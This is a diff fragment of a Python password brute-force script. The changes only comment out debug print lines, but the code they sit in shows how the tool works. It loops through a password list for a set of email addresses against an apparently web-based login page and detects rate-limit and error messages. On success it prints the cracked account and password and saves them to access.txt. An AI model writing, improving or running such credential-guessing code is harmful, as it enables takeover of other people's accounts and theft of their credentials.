@@ -92,7 +92,6 @@ def set(name,setting):
 		print("[-] This command is not found !")
 		
 def run(emails,passlist,timernextupfun,blockedtimerfun):
-	#trying = 1
 	emailsplit = emails.split(',')
 	try:
 		op = open(passlist,"r")
@@ -122,7 +121,7 @@ def run(emails,passlist,timernextupfun,blockedtimerfun):
 				print("[+] {}/{} - Trying password : {}".format(trying,lenghtpassowrdslist,i))
 				for onetext in page2.soup.findAll("div"):
 					gettext = onetext.text
-					#print(gettext)										#Debuger
+					#print(gettext)						#Debuger
 					if "Please try again later" in gettext:
 						if dispayonlyone == 0:
 							dispayonlyone = 1
@@ -139,7 +138,7 @@ def run(emails,passlist,timernextupfun,blockedtimerfun):
 					elif "We're working on getting this fixed as soon as we can" in gettext:
 						ErrorResponse = 1
 				dispayonlyone = 0	
-				print(signupcounter)									#Debuger	
+				#print(signupcounter)						#Debuger	
 				if signupcounter not in [11,9] and ErrorResponse == 0:
 					print("[+] Success login account {}, password = {}".format(email,i))
 					saving = open('access.txt','a')
